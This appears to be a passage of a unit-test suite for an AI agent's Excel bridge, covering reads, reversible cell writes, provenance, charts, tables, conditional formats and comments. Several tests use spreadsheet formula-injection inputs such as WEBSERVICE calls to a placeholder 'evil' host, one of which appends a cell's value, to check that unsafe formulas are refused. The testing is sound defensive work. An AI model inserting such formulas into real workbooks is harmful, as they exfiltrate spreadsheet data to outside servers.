    // Selection (A2:C2) has content → a selection summary is present.
    expect(first.selection).toBeDefined();
    // Named ranges read because ExcelApi >= 1.7.
    expect(first.namedRanges).toEqual([{ name: 'SalesTable', range: 'Sales!A1:C4' }]);

    const second = await bridge.captureDocState();
    expect(second?.version).toBe(2);
  });

  it('omits named ranges on a host below ExcelApi 1.7', async () => {
    active = installExcel(salesSeed(), { apiVersion: 4 });
    const snap = await new ExcelBridge().captureDocState();
    expect(snap?.namedRanges).toBeUndefined();
  });

  it('degrades to an empty used range (no throw) on an empty sheet via getUsedRangeOrNullObject', async () => {
    const seed = salesSeed();
    seed.activeSheet = 'Empty';
    seed.selection = 'Empty!A1';
    active = installExcel(seed);
    const snap = await new ExcelBridge().captureDocState();
    expect(snap).toBeDefined();
    // No used-range content → no table blocks → no selection summary.
    expect(snap?.selection).toBeUndefined();
  });
});

describe('ExcelBridge.searchDocument (ADR-0003 lazy read)', () => {
  it('returns [] for an empty query without touching the host', async () => {
    active = installExcel(salesSeed());
    const runSpy = vi.spyOn(globalThis.Excel as { run: unknown } as { run: () => unknown }, 'run');
    expect(await new ExcelBridge().searchDocument('   ')).toEqual([]);
    expect(runSpy).not.toHaveBeenCalled();
  });

  it('returns matching rows as anchored context (case-insensitive)', async () => {
    active = installExcel(salesSeed());
    const ctx = await new ExcelBridge().searchDocument('west');
    const table = ctx.find((c) => c.value.as === 'text');
    expect(table).toBeDefined();
    if (table && table.value.as === 'text') {
      expect(table.value.text).toContain('West');
      expect(table.value.text).not.toContain('East');
    }
  });

  it('returns [] when the active sheet used range is a null object (empty sheet)', async () => {
    const seed = salesSeed();
    seed.activeSheet = 'Empty';
    active = installExcel(seed);
    expect(await new ExcelBridge().searchDocument('anything')).toEqual([]);
  });
});

describe('ExcelBridge.readRange (ADR-0006 addressable read)', () => {
  it('returns [] for an empty selector', async () => {
    active = installExcel(salesSeed());
    expect(await new ExcelBridge().readRange('   ')).toEqual([]);
  });

  it('reads an A1 range on the active sheet and maps it to anchored context', async () => {
    active = installExcel(salesSeed());
    const ctx = await new ExcelBridge().readRange('A1:C4');
    expect(ctx.some((c) => c.ref.anchor?.locator === 'range:Sales!A1:C4')).toBe(true);
  });

  it('reads a sheet-qualified A1 range on the named sheet', async () => {
    active = installExcel(salesSeed());
    const ctx = await new ExcelBridge().readRange('Sales!A1:C4');
    expect(ctx.length).toBeGreaterThan(0);
  });

  it('resolves a named range selector via the workbook names', async () => {
    active = installExcel(salesSeed());
    const ctx = await new ExcelBridge().readRange('SalesTable');
    expect(ctx.some((c) => c.ref.anchor?.locator === 'range:Sales!A1:C4')).toBe(true);
  });

  it('degrades a missing named range to [] (null object, no throw)', async () => {
    active = installExcel(salesSeed());
    expect(await new ExcelBridge().readRange('NoSuchName')).toEqual([]);
  });

  it('refuses an over-budget range before materializing values (returns [])', async () => {
    active = installExcel(salesSeed());
    // A1:A20000 is 20_000 cells > MAX_READ_CELLS (10_000).
    expect(await new ExcelBridge().readRange('A1:A20000')).toEqual([]);
  });
});

describe('ExcelBridge.revealContext (navigation-only host jump)', () => {
  it('activates the referenced worksheet and selects the range chip address', async () => {
    const seed = salesSeed();
    seed.activeSheet = 'Empty';
    seed.selection = 'Empty!A1';
    active = installExcel(seed);

    await new ExcelBridge().revealContext({
      id: 'xl:Sales!B2:C3',
      kind: 'range',
      surface: 'excel',
      title: 'Sales!B2:C3',
    });

    expect(seed.activeSheet).toBe('Sales');
    expect(seed.selection).toBe('Sales!B2:C3');
  });

  it('resolves a named range chip before selecting it', async () => {
    const seed = salesSeed();
    seed.activeSheet = 'Empty';
    seed.selection = 'Empty!A1';
    active = installExcel(seed);

    await new ExcelBridge().revealContext({
      id: 'xl:SalesTable',
      kind: 'range',
      surface: 'excel',
      title: 'SalesTable',
    });

    expect(seed.activeSheet).toBe('Sales');
    expect(seed.selection).toBe('Sales!A1:C4');
  });

  it('ignores non-Excel refs and refs without an addressable selector', async () => {
    const seed = salesSeed();
    active = installExcel(seed);

    await new ExcelBridge().revealContext({
      id: 'word:selection',
      kind: 'selection',
      surface: 'word',
      title: 'Selection',
    });
    await new ExcelBridge().revealContext({
      id: 'ctx:opaque',
      kind: 'document',
      surface: 'excel',
      title: 'Opaque',
    });

    expect(seed.activeSheet).toBe('Sales');
    expect(seed.selection).toBe('Sales!A2:C2');
  });
});

describe('ExcelBridge.actuate write-cells (reversible, address-anchored)', () => {
  it.each([
    { cells: [], cellValues: [[42]], range: 'Sales!A2', location: 'Sales!A2' },
    {
      cells: [['legacy']],
      cellValues: [
        [1, 2],
        [3, 4],
      ],
      range: 'Sales!A2',
      location: 'Sales!A2:B3',
    },
    {
      cells: [
        ['legacy', 'wrong'],
        ['wrong', 'wrong'],
      ],
      cellValues: [[42]],
      range: 'Sales!A2',
      location: 'Sales!A2',
    },
  ])('uses typed dimensions for the host write, verification and inverse: %j', async (fixture) => {
    active = installExcel(salesSeed());
    const bridge = new ExcelBridge();
    const before = await bridge.captureCells(fixture.location);
    const res = await bridge.actuate(
      writeCells({
        target: { range: fixture.range },
        cells: fixture.cells,
        cellValues: fixture.cellValues,
      }),
    );
    expect(res).toMatchObject({
      ok: true,
      location: fixture.location,
      verification: { status: 'verified', beforeHash: before.hash },
      inverse: { op: 'restore-cells', range: fixture.location, values: before.values },
    });
    const after = await bridge.captureCells(fixture.location);
    expect(after.values).toEqual(fixture.cellValues.map((row) => row.map(String)));
    expect(active.seed.sheets[0]?.values.flat()).not.toContain('legacy');
    // C is outside every typed result, even when the legacy grid has a different shape.
    expect(active.seed.sheets[0]?.values[1]?.[2]).toBe('300');
  });

  it('rejects an explicit empty typed grid without falling back to populated legacy cells', async () => {
    active = installExcel(salesSeed());
    const before = structuredClone(active.seed.sheets);
    const res = await new ExcelBridge().actuate(
      writeCells({ target: { range: 'Sales!A2' }, cells: [['legacy']], cellValues: [] }),
    );
    expect(res).toMatchObject({ ok: false, error: { code: 'invalid_request' } });
    expect(active.seed.sheets).toEqual(before);
    expect(active.workbook()).toBeUndefined();
  });

  it('preserves typed scalars and formula-looking literals through the Office write channel', async () => {
    active = installExcel(salesSeed());
    const writes = vi.spyOn(FakeRange.prototype, 'values', 'set');
    const formulaWrites = vi.spyOn(FakeRange.prototype, 'formulas', 'set');
    try {
      const res = await new ExcelBridge().actuate(
        writeCells({
          target: { range: 'Sales!A2' },
          cells: [['=SUM(A1:A2)']],
          cellValues: [[17, true, null, '=WEBSERVICE("https://example.com")', '0017']],
        }),
      );
      expect(res).toMatchObject({
        ok: true,
        location: 'Sales!A2:E2',
        verification: { status: 'verified' },
      });
      expect(writes).toHaveBeenCalledWith([
        [17, true, '', '\'=WEBSERVICE("https://example.com")', "'0017"],
      ]);
      expect(formulaWrites).not.toHaveBeenCalled();
    } finally {
      writes.mockRestore();
      formulaWrites.mockRestore();
    }
  });

  it('still refuses unsafe explicit formulas before touching the host', async () => {
    active = installExcel(salesSeed());
    const before = structuredClone(active.seed.sheets);
    const res = await new ExcelBridge().actuate(
      writeCells({
        target: { range: 'Sales!A2' },
        cells: [['safe legacy text']],
        cellValues: [[null]],
        cellFormulas: [['=WEBSERVICE("https://example.com")']],
      }),
    );
    expect(res).toMatchObject({ ok: false, error: { code: 'unsafe_formula' } });
    expect(active.seed.sheets).toEqual(before);
    expect(active.workbook()).toBeUndefined();
  });

  it('routes explicit formulas separately from typed scalars and formula-looking literals', async () => {
    active = installExcel(salesSeed());
    const writes = vi.spyOn(FakeRange.prototype, 'values', 'set');
    const formulaWrites = vi.spyOn(FakeRange.prototype, 'formulas', 'set');
    try {
      const res = await new ExcelBridge().actuate(
        writeCells({
          target: { range: 'Sales!A2:C2' },
          cells: [['ignored']],
          cellValues: [[3, null, '=literal']],
          cellFormulas: [['', '=SUM(A3:A4)', '']],
        }),
      );
      expect(res).toMatchObject({ ok: true, verification: { status: 'verified' } });
      expect(writes).toHaveBeenCalledWith([[3, null, "'=literal"]]);
      expect(formulaWrites).toHaveBeenCalledWith([[null, '=SUM(A3:A4)', null]]);
    } finally {
      writes.mockRestore();
      formulaWrites.mockRestore();
    }
  });

  it('writes literal values into the target range and returns ok with the location', async () => {
    active = installExcel(salesSeed());
    const res = await new ExcelBridge().actuate(
      writeCells({ target: { range: 'Sales!A2:C2' }, cells: [['EAST', 'ALICE', '999']] }, 'chg-1'),
    );
    expect(res).toMatchObject({ ok: true, changeId: asChangeId('chg-1'), location: 'Sales!A2:C2' });
    expect(active.seed.sheets[0]?.values[1]).toEqual(['EAST', 'ALICE', '999']);
    // No provenance payload → flagged unattributed.
    expect(res.provenanceMissing).toBe(true);
  });

  it('rejects with no_anchor when target.range is absent (before any write)', async () => {
    active = installExcel(salesSeed());
    const res = await new ExcelBridge().actuate(writeCells({ cells: [['x']] }));
    expect(res).toMatchObject({ ok: false, error: { code: 'no_anchor' } });
  });

  it('rejects with no_cells when params.cells is empty', async () => {
    active = installExcel(salesSeed());
    const res = await new ExcelBridge().actuate(writeCells({ target: { range: 'Sales!A1' } }));
    expect(res).toMatchObject({ ok: false, error: { code: 'no_cells' } });
  });

  it('routes a safe =-formula into the formula grid and evaluates (records) it', async () => {
    active = installExcel(salesSeed());
    const res = await new ExcelBridge().actuate(
      writeCells({ target: { range: 'Sales!E1:E1' }, cells: [['=SUM(C2:C4)']] }, 'chg-f'),
    );
    expect(res.ok).toBe(true);
    // The formula string is recorded into the seed cell (E1 relative to A1 origin = row0 col4).
    expect(active.seed.sheets[0]?.values[0]?.[4]).toBe('=SUM(C2:C4)');
  });

  it('refuses an unsafe active-content formula (degraded, unsafe_formula) and writes nothing', async () => {
    active = installExcel(salesSeed());
    const before = JSON.stringify(active.seed.sheets[0]?.values);
    const res = await new ExcelBridge().actuate(
      writeCells({ target: { range: 'Sales!E1' }, cells: [['=WEBSERVICE("http://evil")']] }),
    );
    expect(res).toMatchObject({ ok: false, degraded: true, error: { code: 'unsafe_formula' } });
    // The untrusted, dangerous formula never reached the host.
    expect(JSON.stringify(active.seed.sheets[0]?.values)).toBe(before);
  });

  it('attaches a citation comment from provenance.sources when ExcelApi >= 1.10', async () => {
    active = installExcel(salesSeed());
    const res = await new ExcelBridge().actuate({
      ...writeCells({ target: { range: 'Sales!A2:C2' }, cells: [['a', 'b', 'c']] }, 'chg-c'),
      provenance: PROVENANCE,
    });
    expect(res.ok).toBe(true);
    const comments = active.workbook()?.comments.added ?? [];
    expect(comments).toHaveLength(1);
    expect(comments[0]?.content).toContain('SLA Policy');
    expect(comments[0]?.cell).toBe('Sales!A2'); // anchor (first) cell of the target.
  });

  it('still reports the write ok when the citation comment attach throws (best-effort)', async () => {
    active = installExcel(salesSeed());
    const bridge = new ExcelBridge();
    // Make every run's comment collection throw on add.
    patchRun((ctx) => {
      ctx.workbook.comments.throwOnAdd = true;
    });
    const res = await bridge.actuate({
      ...writeCells({ target: { range: 'Sales!A2:C2' }, cells: [['a', 'b', 'c']] }),
      provenance: PROVENANCE,
    });
    expect(res.ok).toBe(true); // reversible write already landed; citation is additive.
  });

  it('does not attach a citation comment on a host below ExcelApi 1.10', async () => {
    active = installExcel(salesSeed(), { apiVersion: 9 });
    const res = await new ExcelBridge().actuate({
      ...writeCells({ target: { range: 'Sales!A2:C2' }, cells: [['a', 'b', 'c']] }),
      provenance: PROVENANCE,
    });
    expect(res.ok).toBe(true);
    expect(active.workbook()?.comments.added ?? []).toHaveLength(0);
  });

  it('writes into the active sheet when the target has no sheet qualifier', async () => {
    active = installExcel(salesSeed());
    const res = await new ExcelBridge().actuate(
      writeCells({ target: { range: 'A2:C2' }, cells: [['p', 'q', 'r']] }),
    );
    expect(res).toMatchObject({ ok: true, location: 'Sales!A2:C2' });
    expect(active.seed.sheets[0]?.values[1]).toEqual(['p', 'q', 'r']);
  });

  it("unwraps a quoted sheet name with spaces ('My Sales'!A2:C2) to the right worksheet", async () => {
    const seed = seedOf({
      sheets: [
        {
          name: 'My Sales',
          origin: 'A1',
          values: [
            ['region', 'rep', 'revenue'],
            ['East', 'Alice', '300'],
          ],
        },
      ],
      activeSheet: 'My Sales',
      selection: "'My Sales'!A2:C2",
    });
    active = installExcel(seed);
    const res = await new ExcelBridge().actuate(
      writeCells({ target: { range: "'My Sales'!A2:C2" }, cells: [['X', 'Y', 'Z']] }),
    );
    expect(res.ok).toBe(true);
    // The quoted qualifier resolved to the named sheet, not a getItem typo throw.
    expect(seed.sheets[0]?.values[1]).toEqual(['X', 'Y', 'Z']);
  });
});

describe('ExcelBridge write-cells durable provenance (BUILD-PLAN 1.6)', () => {
  it('persists the provenance record into the document settings bag and saves it', async () => {
    active = installExcel(salesSeed());
    const res = await new ExcelBridge().actuate({
      ...writeCells({ target: { range: 'Sales!A2:C2' }, cells: [['a', 'b', 'c']] }, 'chg-p'),
      provenance: PROVENANCE,
    });
    expect(res.ok).toBe(true);
    expect(res.provenanceDropped).toBeUndefined();
    expect(res.provenanceMissing).toBeUndefined();
    expect(active.settings.store.has('ge:prov:chg-p')).toBe(true);
    expect(active.settings.saveCalls).toBe(1);
  });

  it('flags provenanceDropped when saveAsync reports failure (write still ok)', async () => {
    active = installExcel(salesSeed());
    active.settings.saveFails = true;
    const res = await new ExcelBridge().actuate({
      ...writeCells({ target: { range: 'Sales!A2:C2' }, cells: [['a', 'b', 'c']] }, 'chg-d'),
      provenance: PROVENANCE,
    });
    expect(res.ok).toBe(true);
    expect(res.provenanceDropped).toBe(true);
  });

  it('flags provenanceDropped when the settings bag is absent (older host)', async () => {
    active = installExcel(salesSeed(), { withSettings: false });
    const res = await new ExcelBridge().actuate({
      ...writeCells({ target: { range: 'Sales!A2:C2' }, cells: [['a', 'b', 'c']] }),
      provenance: PROVENANCE,
    });
    expect(res.ok).toBe(true);
    expect(res.provenanceDropped).toBe(true);
  });

  it('flags provenanceDropped when settings.set throws', async () => {
    active = installExcel(salesSeed());
    active.settings.setThrows = true;
    const res = await new ExcelBridge().actuate({
      ...writeCells({ target: { range: 'Sales!A2:C2' }, cells: [['a', 'b', 'c']] }),
      provenance: PROVENANCE,
    });
    expect(res.ok).toBe(true);
    expect(res.provenanceDropped).toBe(true);
  });

  it('flags provenanceDropped when saveAsync itself throws synchronously', async () => {
    active = installExcel(salesSeed());
    active.settings.saveThrows = true;
    const res = await new ExcelBridge().actuate({
      ...writeCells({ target: { range: 'Sales!A2:C2' }, cells: [['a', 'b', 'c']] }),
      provenance: PROVENANCE,
    });
    // The reversible write landed; the save throw is observed as a drop, not swallowed silently.
    expect(res.ok).toBe(true);
    expect(res.provenanceDropped).toBe(true);
  });
});

describe('ExcelBridge.actuate format-cells', () => {
  it('applies each present facet to the range and records it', async () => {
    active = installExcel(salesSeed());
    const res = await new ExcelBridge().actuate(
      formatCells(
        {
          target: { range: 'Sales!A1:C1' },
          format: { bold: true, italic: false, fill: '#FFF2CC', numberFormat: '$#,##0.00' },
        },
        'chg-fmt',
      ),
    );
    expect(res).toMatchObject({ ok: true, location: 'Sales!A1:C1' });
    expect(active.seed.formats.get('Sales!A1:C1')).toEqual({
      bold: true,
      italic: false,
      fill: '#FFF2CC',
      numberFormat: '$#,##0.00',
    });
  });

  it('rejects with no_anchor when no target.range', async () => {
    active = installExcel(salesSeed());
    const res = await new ExcelBridge().actuate(formatCells({ format: { bold: true } }));
    expect(res).toMatchObject({ ok: false, error: { code: 'no_anchor' } });
  });

  it('rejects with no_format when no format facets are given', async () => {
    active = installExcel(salesSeed());
    const res = await new ExcelBridge().actuate(formatCells({ target: { range: 'Sales!A1' } }));
    expect(res).toMatchObject({ ok: false, error: { code: 'no_format' } });
  });
});

describe('ExcelBridge.actuate create-table (ADR-0007 table verb)', () => {
  it('promotes the range to a native table and records the MINTED name as the inverse identity', async () => {
    active = installExcel(salesSeed());
    const res = await new ExcelBridge().actuate(
      createTable(
        { table: { range: 'Sales!A1:C4', hasHeaders: true, name: 'ModelChosen' } },
        'chg-t',
      ),
    );
    expect(res).toMatchObject({ ok: true, changeId: asChangeId('chg-t'), location: 'Sales!A1:C4' });
    // `tables.add` was called with the right address + hasHeaders.
    const minted = active.seed.tables;
    expect(minted).toHaveLength(1);
    expect(minted[0]).toMatchObject({ sheet: 'Sales', address: 'A1:C4', hasHeaders: true });
    // The inverse deletes the host-MINTED name (Table1), NOT the model-chosen "ModelChosen".
    expect(res.inverse).toEqual({ op: 'delete-object', objectType: 'table', name: 'Table1' });
    expect(res.inverse).not.toMatchObject({ name: 'ModelChosen' });
  });

  it('defaults hasHeaders to true when omitted by the model', async () => {
    active = installExcel(salesSeed());
    // Model omits hasHeaders (the schema defaults it to true at the gateway boundary). The bridge's
    // pure plan applies the same default, so the host write still promotes with headers.
    await new ExcelBridge().actuate(createTable({ table: { range: 'Sales!A1:C4' } as never }));
    expect(active.seed.tables[0]?.hasHeaders).toBe(true);
  });

  it('fails closed (no_anchor) when params.table is absent — no host touch', async () => {
    active = installExcel(salesSeed());
    const res = await new ExcelBridge().actuate(createTable({}));
    expect(res).toMatchObject({ ok: false, error: { code: 'no_anchor' } });
    expect(active.seed.tables).toHaveLength(0);
  });

  it('persists durable provenance for the table write', async () => {
    active = installExcel(salesSeed());
    const res = await new ExcelBridge().actuate({
      ...createTable({ table: { range: 'Sales!A1:C4', hasHeaders: true } }, 'chg-tp'),
      provenance: PROVENANCE,
    });
    expect(res.ok).toBe(true);
    expect(active.settings.store.has('ge:prov:chg-tp')).toBe(true);
  });
});

describe('ExcelBridge.actuate insert-chart (ADR-0007 chart verb)', () => {
  it('adds a chart with the mapped type/seriesBy and records the MINTED chart name as inverse', async () => {
    active = installExcel(salesSeed());
    const res = await new ExcelBridge().actuate(
      insertChart(
        {
          chart: {
            chartType: 'column',
            sourceRange: 'Sales!A1:C4',
            seriesBy: 'columns',
            title: 'Revenue',
          },
        },
        'chg-ch',
      ),
    );
    expect(res.ok).toBe(true);
    const charts = active.seed.charts;
    expect(charts).toHaveLength(1);
    // agent enums mapped: column → ColumnClustered, columns → Columns.
    expect(charts[0]).toMatchObject({
      chartType: 'ColumnClustered',
      seriesBy: 'Columns',
      sourceAddress: 'Sales!A1:C4',
      title: 'Revenue',
    });
    // The inverse deletes the host-MINTED chart name.
    expect(res.inverse).toEqual({ op: 'delete-object', objectType: 'chart', name: 'Chart 1' });
    expect(res.location).toBe('Chart 1');
  });

  it("adds a chart over a quoted worksheet name with spaces ('Project schedule'!B5:D30)", async () => {
    const seed = seedOf({
      sheets: [
        {
          name: 'Project schedule',
          origin: 'B5',
          values: [
            ['Task', 'Progress', 'Duration'],
            ['Define goals', '0.5', '4'],
            ['Conduct studies', '0.6', '3'],
          ],
        },
      ],
      activeSheet: 'Project schedule',
      selection: "'Project schedule'!B5:D30",
    });
    active = installExcel(seed);
    const res = await new ExcelBridge().actuate(
      insertChart(
        {
          chart: {
            chartType: 'bar',
            sourceRange: "'Project schedule'!B5:D30",
            seriesBy: 'auto',
            title: 'Task Progress',
          },
        },
        'chg-chart-quoted',
      ),
    );

    expect(res.ok).toBe(true);
    expect(seed.charts[0]).toMatchObject({
      chartType: 'BarClustered',
      sourceAddress: 'Project schedule!B5:D30',
      title: 'Task Progress',
    });
  });

  it('maps each agent chart type to its Excel.ChartType', async () => {
    const cases: Array<[string, string]> = [
      ['bar', 'BarClustered'],
      ['line', 'Line'],
      ['pie', 'Pie'],
      ['scatter', 'XYScatter'],
      ['area', 'Area'],
    ];
    for (const [agent, host] of cases) {
      active?.restore();
      active = installExcel(salesSeed());
      await new ExcelBridge().actuate(
        insertChart({
          chart: { chartType: agent as 'bar', sourceRange: 'Sales!A1:C4', seriesBy: 'auto' },
        }),
      );
      expect(active.seed.charts[0]?.chartType).toBe(host);
      expect(active.seed.charts[0]?.seriesBy).toBe('Auto');
    }
  });

  it('fails closed (no_anchor) when params.chart is absent — no host touch', async () => {
    active = installExcel(salesSeed());
    const res = await new ExcelBridge().actuate(insertChart({}));
    expect(res).toMatchObject({ ok: false, error: { code: 'no_anchor' } });
    expect(active.seed.charts).toHaveLength(0);
  });
});

describe('ExcelBridge.actuate format-conditional (ADR-0007 cf verb)', () => {
  it('adds a cellValue rule with the mapped operator + fill and records the rule ordinal inverse', async () => {
    active = installExcel(salesSeed());
    const res = await new ExcelBridge().actuate(
      formatConditional(
        {
          conditional: {
            range: 'Sales!C2:C4',
            rule: { kind: 'cellValue', operator: 'gt', value: '200', fill: '#C6EFCE' },
          },
        },
        'chg-cf',
      ),
    );
    expect(res).toMatchObject({ ok: true, location: 'Sales!C2:C4' });
    const rules = active.seed.conditionalFormats.get('Sales!C2:C4');
    expect(rules).toHaveLength(1);
    expect(rules?.[0]).toMatchObject({
      cfType: 'CellValue',
      cellValue: { operator: 'GreaterThan', formula1: '200', fill: '#C6EFCE' },
    });
    // The first rule added to an empty CF collection has ordinal 0.
    expect(res.inverse).toEqual({
      op: 'clear-conditional',
      range: 'Sales!C2:C4',
      ruleOrdinal: 0,
    });
  });

  it('carries formula2 for a between rule', async () => {
    active = installExcel(salesSeed());
    await new ExcelBridge().actuate(
      formatConditional({
        conditional: {
          range: 'Sales!C2:C4',
          rule: { kind: 'cellValue', operator: 'between', value: '100', value2: '300' },
        },
      }),
    );
    expect(active.seed.conditionalFormats.get('Sales!C2:C4')?.[0]?.cellValue).toMatchObject({
      operator: 'Between',
      formula1: '100',
      formula2: '300',
    });
  });

  it('adds a top rule with the BottomItems criterion and the rank', async () => {
    active = installExcel(salesSeed());
    const res = await new ExcelBridge().actuate(
      formatConditional({
        conditional: {
          range: 'Sales!C2:C4',
          rule: { kind: 'top', rank: 2, bottom: true, fill: '#FFC7CE' },
        },
      }),
    );
    expect(res.ok).toBe(true);
    expect(active.seed.conditionalFormats.get('Sales!C2:C4')?.[0]).toMatchObject({
      cfType: 'TopBottom',
      top: { rank: 2, type: 'BottomItems', fill: '#FFC7CE' },
    });
  });

  it('adds a bare dataBar rule', async () => {
    active = installExcel(salesSeed());
    const res = await new ExcelBridge().actuate(
      formatConditional({ conditional: { range: 'Sales!C2:C4', rule: { kind: 'dataBar' } } }),
    );
    expect(res.ok).toBe(true);
    expect(active.seed.conditionalFormats.get('Sales!C2:C4')?.[0]?.cfType).toBe('DataBar');
  });

  it('records an incrementing ordinal when a second rule is added to the same range', async () => {
    active = installExcel(salesSeed());
    const bridge = new ExcelBridge();
    await bridge.actuate(
      formatConditional(
        { conditional: { range: 'Sales!C2:C4', rule: { kind: 'dataBar' } } },
        'cf1',
      ),
    );
    const res2 = await bridge.actuate(
      formatConditional(
        { conditional: { range: 'Sales!C2:C4', rule: { kind: 'colorScale' } } },
        'cf2',
      ),
    );
    // The second rule's inverse ordinal is 1 (it sits at index 1 in the range's CF collection).
    expect(res2.inverse).toMatchObject({ op: 'clear-conditional', ruleOrdinal: 1 });
  });

  it('fails closed (no_anchor) when params.conditional is absent — no host touch', async () => {
    active = installExcel(salesSeed());
    const res = await new ExcelBridge().actuate(formatConditional({}));
    expect(res).toMatchObject({ ok: false, error: { code: 'no_anchor' } });
    expect(active.seed.conditionalFormats.size).toBe(0);
  });

  it('degrades (unsupported_host) on a host below ExcelApi 1.6 without touching the host', async () => {
    active = installExcel(salesSeed(), { apiVersion: 4 });
    const res = await new ExcelBridge().actuate(
      formatConditional({ conditional: { range: 'Sales!C2:C4', rule: { kind: 'dataBar' } } }),
    );
    expect(res).toMatchObject({ ok: false, degraded: true, error: { code: 'unsupported_host' } });
    expect(active.seed.conditionalFormats.size).toBe(0);
  });

  it('degrades (unsafe_formula) when a cellValue threshold is untrusted active content — no host touch', async () => {
    active = installExcel(salesSeed());
    const res = await new ExcelBridge().actuate(
      formatConditional({
        conditional: {
          range: 'Sales!C2:C4',
          rule: { kind: 'cellValue', operator: 'gt', value: 'WEBSERVICE("http://evil/?x="&A1)' },
        },
      }),
    );
    expect(res).toMatchObject({ ok: false, degraded: true, error: { code: 'unsafe_formula' } });
    expect(active.seed.conditionalFormats.size).toBe(0);
  });
});

describe('ExcelBridge.actuate add-comment', () => {
  it('adds a comment anchored to the first cell of the target and returns ok', async () => {
    active = installExcel(salesSeed());
    const res = await new ExcelBridge().actuate(
      addComment({ target: { range: 'Sales!B2:C2' }, text: 'check this' }, 'chg-ac'),
    );
    expect(res).toMatchObject({ ok: true, location: 'Sales!B2' });
    const added = active.workbook()?.comments.added ?? [];
    expect(added).toEqual([{ cell: 'Sales!B2', content: 'check this' }]);
  });

  it('rejects with no_anchor when no target.range', async () => {
    active = installExcel(salesSeed());
    const res = await new ExcelBridge().actuate(addComment({ text: 'note' }));
    expect(res).toMatchObject({ ok: false, error: { code: 'no_anchor' } });
  });

  it('rejects with no_text when the text is empty', async () => {
    active = installExcel(salesSeed());
    const res = await new ExcelBridge().actuate(
      addComment({ target: { range: 'Sales!B2' }, text: '   ' }),
    );
    expect(res).toMatchObject({ ok: false, error: { code: 'no_text' } });
  });

  it('degrades (unsupported) on a host below ExcelApi 1.10 without touching the host', async () => {
    active = installExcel(salesSeed(), { apiVersion: 9 });
    const res = await new ExcelBridge().actuate(
      addComment({ target: { range: 'Sales!B2' }, text: 'note' }),
    );
    expect(res).toMatchObject({ ok: false, degraded: true, error: { code: 'unsupported' } });
    expect(active.workbook()?.comments.added ?? []).toHaveLength(0);
  });
});

describe('ExcelBridge.actuate comment-reply', () => {
  function withComment(): ExcelSeed {
    const seed = salesSeed();
    seed.comments = [{ id: 'cmt-1', cell: 'Sales!A1', content: 'q', replies: [], resolved: false }];
    return seed;
  }

  it('replies to an existing comment and resolves it when asked', async () => {
    active = installExcel(withComment());
    const res = await new ExcelBridge().actuate(
      commentReply(
        { text: 'answered', target: { commentId: 'cmt-1' }, resolveComment: true },
        'chg-cr',
      ),
    );
    expect(res).toMatchObject({ ok: true, location: 'comment:cmt-1' });
    expect(active.seed.comments[0]?.replies).toEqual(['answered']);
    expect(active.seed.comments[0]?.resolved).toBe(true);
  });

  it('does not resolve when resolveComment is absent', async () => {
    active = installExcel(withComment());
    await new ExcelBridge().actuate(
      commentReply({ text: 'answered', target: { commentId: 'cmt-1' } }),
    );
    expect(active.seed.comments[0]?.resolved).toBe(false);
  });

  it('rejects with no_comment when no commentId is given', async () => {
    active = installExcel(withComment());
    const res = await new ExcelBridge().actuate(commentReply({ text: 'x' }));
    expect(res).toMatchObject({ ok: false, error: { code: 'no_comment' } });
  });

  it('degrades (comment_gone) when the target comment no longer exists', async () => {
    active = installExcel(salesSeed()); // no comments seeded
    const res = await new ExcelBridge().actuate(
      commentReply({ text: 'x', target: { commentId: 'missing' } }),
    );
    expect(res).toMatchObject({ ok: false, degraded: true, error: { code: 'comment_gone' } });
  });
});

describe('ExcelBridge.actuate unsupported', () => {
  it('returns an unsupported error for an actuation kind Excel cannot do', async () => {
    active = installExcel(salesSeed());
    const res = await new ExcelBridge().actuate({
      changeId: asChangeId('chg-u'),
      kind: 'tracked-change',
      surface: 'excel',
      params: { text: 'x' },
    });
    expect(res).toMatchObject({ ok: false, error: { code: 'unsupported' } });
    expect(res.kind).toBe('tracked-change');
  });
});

describe('ExcelBridge.watch (event wiring)', () => {
  it('emits mapped HostEvents for selection / change / comment, then unsubscribes them', async () => {
    active = installExcel(salesSeed());
    const events: HostEvent[] = [];
    const bridge = new ExcelBridge();
    const unsub = bridge.watch((e) => events.push(e));
    // Let the async registration run.
    await Promise.resolve();
    await Promise.resolve();

    const wb = active.workbook();
    expect(wb).toBeDefined();
    if (!wb) return;
    wb.worksheets.onSelectionChanged.fire({ address: 'Sales!B2' });
    wb.worksheets.onChanged.fire({ source: 'Remote' });
    wb.comments.onAdded.fire({ source: 'Local', commentDetails: [{ commentId: 'c-9' }] });

    expect(events).toEqual([
      { type: 'selection-changed', surface: 'excel', origin: 'local', preview: 'Sales!B2' },
      { type: 'document-changed', surface: 'excel', origin: 'remote' },
      { type: 'comment-added', surface: 'excel', origin: 'local', commentId: 'c-9' },
    ]);

    // Unsubscribe removes every handler so no further events are emitted.
    unsub();
    await Promise.resolve();
    await Promise.resolve();
    wb.worksheets.onSelectionChanged.fire({ address: 'Sales!C3' });
    expect(events).toHaveLength(3);
  });

  it('does not register events the active requirement set lacks (older host)', async () => {
    active = installExcel(salesSeed(), { apiVersion: 9 }); // < 1.12 → no comment events
    const events: HostEvent[] = [];
    new ExcelBridge().watch((e) => events.push(e));
    await Promise.resolve();
    await Promise.resolve();
    const wb = active.workbook();
    if (!wb) return;
    // selection + change exist at 1.9; comments (1.12) were never wired.
    expect(wb.comments.onAdded.handlers).toHaveLength(0);
    expect(wb.worksheets.onSelectionChanged.handlers.length).toBeGreaterThan(0);
  });

  it('isolates a failing event .add(): other events still register and emit, unsub is safe', async () => {
    active = installExcel(salesSeed());
    // Force the registration run's selection-changed .add() to throw — the per-handler try/catch
    // must isolate it so the document-changed / comment events still register and still emit.
    patchRun((ctx) => {
      ctx.workbook.worksheets.onSelectionChanged.throwOnAdd = true;
    });

    const events: HostEvent[] = [];
    const unsub = new ExcelBridge().watch((e) => events.push(e));
    await Promise.resolve();
    await Promise.resolve();

    const wb = active.workbook();
    expect(wb).toBeDefined();
    if (!wb) return;
    // The failed selection registration left no handler; the others survived and still emit.
    expect(wb.worksheets.onSelectionChanged.handlers).toHaveLength(0);
    wb.worksheets.onChanged.fire({ source: 'Local' });
    expect(events).toEqual([{ type: 'document-changed', surface: 'excel', origin: 'local' }]);

    // Unsubscribe must not throw even though one registration failed.
    expect(() => unsub()).not.toThrow();
  });
});
